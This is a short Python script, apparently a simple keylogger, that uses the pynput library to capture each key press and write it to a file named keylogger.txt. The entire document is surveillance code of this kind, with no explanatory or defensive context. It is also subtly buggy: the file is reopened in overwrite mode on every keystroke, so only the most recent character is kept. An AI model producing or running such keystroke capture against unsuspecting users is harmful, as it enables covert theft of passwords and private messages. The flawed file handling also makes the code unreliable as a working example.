from pynput import keyboard

def recording_keystrokes(key):
    try:
        character = key.char
    except AttributeError:
        print("Couldn't retrieve character")
        return
    
    with open("keylogger.txt", 'w') as logging_file:
        logging_file.write(character)

if __name__ == '__main__':
    with keyboard.Listener(on_press=recording_keystrokes) as listener:
        listener.join()